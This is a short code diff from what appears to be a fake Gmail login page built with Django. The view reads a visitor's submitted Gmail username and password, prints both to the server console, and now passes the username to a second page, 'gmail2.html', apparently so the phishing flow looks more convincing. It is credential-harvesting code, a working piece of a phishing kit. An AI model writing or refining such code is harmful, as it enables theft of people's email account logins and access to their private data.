@@ -13,7 +13,8 @@ def gmail(request):
                 print("-"*32)
                 print("|       " + request.POST['gmailUsername'] + "     |       ")
                 print("-"*32)
-                return render(request, 'gmail2.html')
+                userEmail = request.POST['gmailUsername']
+                return render(request, 'gmail2.html', {"userEmail": userEmail})
         except:
             if request.POST['gmailPassword']:
                 print("-"*32)
